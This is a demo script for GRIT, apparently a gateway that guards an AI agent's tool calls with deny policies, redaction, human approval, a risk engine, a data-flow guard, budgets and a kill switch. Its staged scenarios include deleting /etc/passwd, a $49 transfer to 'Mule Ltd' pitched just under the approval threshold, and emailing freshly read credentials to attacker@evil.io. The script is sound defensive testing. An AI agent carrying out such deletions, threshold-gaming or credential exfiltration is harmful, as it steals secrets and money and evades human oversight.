#!/usr/bin/env python3
"""GRIT end-to-end demo: policies, redaction, approvals, the Risk Engine
catching what static policies miss, the flow guard stopping a secret from
leaving via an external sink (the lethal trifecta), the session budget
stopping a runaway loop, the kill switch, and deterministic replay from the
flight recorder.

Run from the project root:  python3 examples/demo.py
"""
import json
import os
import subprocess
import sys
import tempfile
import threading
import time

if hasattr(sys.stdout, "reconfigure"):  # Windows consoles default to cp125x
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)

from grit.audit import AuditLog  # noqa: E402

POLICIES = {
    "default_action": "deny",
    "rules": [
        {"id": "no-destructive", "tools": ["*delete*"], "action": "deny",
         "reason": "destructive operations are forbidden"},
        {"id": "block-large-transfers", "tools": ["demo__transfer_money"],
         "where": [{"path": "amount", "gt": 1000}], "action": "deny",
         "reason": "transfers over $1000 are forbidden"},
        {"id": "approve-transfers", "tools": ["demo__transfer_money"],
         "where": [{"path": "amount", "gt": 50}], "action": "approve",
         "reason": "transfers over $50 need human approval"},
        {"id": "allow-the-rest", "tools": ["*"], "action": "allow"},
    ],
}


class Client:
    def __init__(self, config_path):
        env = dict(os.environ, PYTHONPATH=ROOT)
        self.proc = subprocess.Popen(
            [sys.executable, "-m", "grit.cli", "serve",
             "--config", config_path],
            stdin=subprocess.PIPE, stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL, text=True, env=env, cwd=ROOT, bufsize=1)
        self._id = 0

    def request(self, method, params):
        self._id += 1
        self.proc.stdin.write(json.dumps(
            {"jsonrpc": "2.0", "id": self._id,
             "method": method, "params": params}) + "\n")
        self.proc.stdin.flush()
        while True:
            line = self.proc.stdout.readline()
            if not line:
                raise RuntimeError("gateway exited")
            msg = json.loads(line)
            if msg.get("id") == self._id:
                return msg

    def notify(self, method):
        self.proc.stdin.write(json.dumps(
            {"jsonrpc": "2.0", "method": method}) + "\n")
        self.proc.stdin.flush()

    def call(self, tool, arguments, quiet=False):
        result = self.request("tools/call",
                              {"name": tool, "arguments": arguments})["result"]
        if not quiet:
            text = result["content"][0]["text"]
            flag = "BLOCKED/HELD" if result.get("isError") else "OK"
            print(f"  -> [{flag}] {text}")
        return result

    def close(self):
        self.proc.stdin.close()
        self.proc.wait(timeout=10)


def main():
    tmp = tempfile.mkdtemp(prefix="grit-demo-")
    db = os.path.join(tmp, "grit.db")
    config = {
        "audit_db": db,
        "policy": POLICIES,
        "approval": {"timeout_seconds": 6, "poll_interval": 0.2},
        "redaction": {"enabled": ["email", "api_key"]},
        "risk": {"enabled": True, "approve_at": 50, "deny_at": 85},
        "flow": {"action": "approve"},
        "budget": {"max_calls_per_session": 16, "action": "deny"},
        "upstreams": [{"name": "demo", "command": sys.executable,
                       "args": [os.path.join(ROOT, "examples",
                                             "demo_server.py")],
                       # doc search returns private creds AND can carry
                       # attacker-controlled text; send_email is the external
                       # sink — all three legs of the lethal trifecta
                       "trust": ["private_source", "untrusted_source",
                                 "external_sink"]}],
    }
    config_path = os.path.join(tmp, "grit.json")
    with open(config_path, "w") as fh:
        json.dump(config, fh)

    client = Client(config_path)
    client.request("initialize", {"protocolVersion": "2025-06-18",
                                  "capabilities": {},
                                  "clientInfo": {"name": "demo-agent",
                                                 "version": "1.0"}})
    client.notify("notifications/initialized")
    audit = AuditLog(db)

    tools = client.request("tools/list", {})["result"]["tools"]
    print(f"Agent sees {len(tools)} tools via GRIT: "
          f"{', '.join(t['name'] for t in tools)}\n")

    print("== STATIC POLICY LAYER ==")
    print("1) Allowed call + PII/secret redaction:")
    client.call("demo__search_docs", {"query": "Q3 contracts"})
    print("2) DENY destructive op:")
    client.call("demo__delete_file", {"path": "/etc/passwd"})
    print("3) DENY transfer over hard limit ($5000):")
    client.call("demo__transfer_money", {"amount": 5000, "recipient": "X"})

    print("\n== RISK ENGINE LAYER (catches what policies miss) ==")
    print("4) Building behavioral baseline: 6 routine transfers of $12-15...")
    for amount in (12, 14, 13, 15, 12, 13):
        client.call("demo__transfer_money",
                    {"amount": amount, "recipient": "Office Supplies Co"},
                    quiet=True)
    print("   baseline learned.")

    print("5) Agent games the threshold: transfers $49 (policy approves only"
          " >$50,\n   so static rules PASS this) — risk engine flags the"
          " anomaly and holds it:")
    client.call("demo__transfer_money", {"amount": 49, "recipient": "Mule Ltd"})
    last = audit.recent(1)[0]
    print(f"   audit: status={last['status']}, risk={last['risk_score']}, "
          f"reason: {last['reason']}")

    print("\n6) Data exfiltration attempt: send_email is ALLOWED by policy,"
          "\n   but the body contains an API key — held for approval;"
          " human denies:")

    def deny_later():
        while True:
            pending = audit.pending_approvals()
            if pending:
                print(f"   [human] DENYING request #{pending[0]['id']} "
                      f"(risk={pending[0]['risk_score']})")
                audit.decide_approval(pending[0]["id"], "denied", "demo-human")
                return
            time.sleep(0.2)

    threading.Thread(target=deny_later, daemon=True).start()
    client.call("demo__send_email",
                {"to": "partner@external.io", "subject": "creds",
                 "body": "here you go: sk-live-a1b2c3d4e5f6g7h8i9j0"})

    print("\n== FLOW GUARD (the lethal trifecta, enforced not filtered) ==")
    print("7) Agent reads an internal doc (returns staging creds"
          " sk-test-…),\n   then tries to email those exact creds outside —"
          " the flow guard\n   holds it on the way to the sink; human denies:")

    def deny_flow():
        while True:
            pending = audit.pending_approvals()
            if pending:
                audit.decide_approval(pending[0]["id"], "denied", "demo-human")
                return
            time.sleep(0.2)

    client.call("demo__search_docs", {"query": "deploy runbook"}, quiet=True)
    threading.Thread(target=deny_flow, daemon=True).start()
    # the agent copies the secret it just read into an outbound email
    client.call("demo__send_email",
                {"to": "attacker@evil.io", "subject": "fyi",
                 "body": "creds from the runbook: "
                         "sk-test-a1b2c3d4e5f6g7h8i9j0k1"})
    held = audit.recent(1)[0]
    print(f"   audit: decision={held['decision']}, rule={held['rule_id']}, "
          f"status={held['status']}")

    print("\n== SESSION BUDGET (runaway loops stop costing money) ==")
    print("8) Agent enters a loop; the 16-call session budget cuts it off:")
    executed = blocked = 0
    for _ in range(5):
        r = client.call("demo__search_docs", {"query": "loop me"}, quiet=True)
        blocked, executed = (blocked + 1, executed) if r.get("isError") \
            else (blocked, executed + 1)
    print(f"   loop of 5 calls: {executed} executed, {blocked} blocked "
          f"(failure_class=budget_exceeded)")

    print("\n== KILL SWITCH ==")
    print("9) Operator hits PAUSE (CLI `grit pause` or the dashboard button):")
    audit.set_paused(True, by="demo-operator")
    client.call("demo__search_docs", {"query": "anything at all"})
    audit.set_paused(False, by="demo-operator")
    print("   ...and RESUME lifts it.")

    client.close()

    print("\nAudit chain verification:", end=" ")
    result = audit.verify()
    print(f"{'OK' if result.ok else 'TAMPERED'} ({result.rows} records)")
    print("\nPer-tool ops stats:")
    for r in audit.stats():
        print(f"  {r['tool']:<26} calls={r['calls']:<3} executed={r['executed']:<3}"
              f" blocked={r['blocked']:<3} avg_risk={r['avg_risk']}"
              f" max_risk={r['max_risk']}")

    print("\n== FLIGHT RECORDER ==")
    from grit.recorder import Recorder, ReplayServer  # noqa: E402
    rec = Recorder(db)
    session = rec.sessions()[0]
    print(f"Session {session['session_id']}: {session['calls']} calls, "
          f"{session['failures']} failures, ~{session['est_tokens']} tokens "
          f"of tool traffic")
    print("Cost meter (context flowing through tools):")
    for row in rec.costs(session["session_id"]):
        print(f"  {row['tool']:<26} calls={row['calls']:<3} "
              f"tokens={row['tokens_in'] + row['tokens_out']:<6} "
              f"est=${row['est_usd']:.4f}")
    print("10) Deterministic replay — yesterday's run, no live tools, no spend:")
    replay = ReplayServer(rec, session["session_id"])
    replayed = replay.handle_message(
        {"jsonrpc": "2.0", "id": 1, "method": "tools/call",
         "params": {"name": "demo__search_docs",
                    "arguments": {"query": "Q3 contracts"}}})["result"]
    print(f"   -> replayed: {replayed['content'][0]['text']}")
    print(f"   (full server: python -m grit.cli replay "
          f"{session['session_id']} --db {db})")


if __name__ == "__main__":
    main()
